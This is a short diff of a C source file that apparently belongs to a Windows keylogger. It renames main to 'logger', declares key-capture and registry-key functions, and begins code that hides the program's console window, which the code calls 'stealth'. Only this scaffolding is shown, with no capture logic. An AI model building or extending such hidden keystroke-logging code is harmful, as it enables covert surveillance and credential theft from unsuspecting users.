@@ -2,14 +2,14 @@
 #include<stdio.h>
 #include<winuser.h>
 #include<windowsx.h>
-
 #define BUFSIZE 80
+#include "targetver.h"
 
 int test_key(void);
 int create_key(char *);
 int get_keys(void);
 
-int main(void)
+int logger(void)
 {
 	HWND stealth; /*creating stealth (window is not visible)*/
 	AllocConsole();
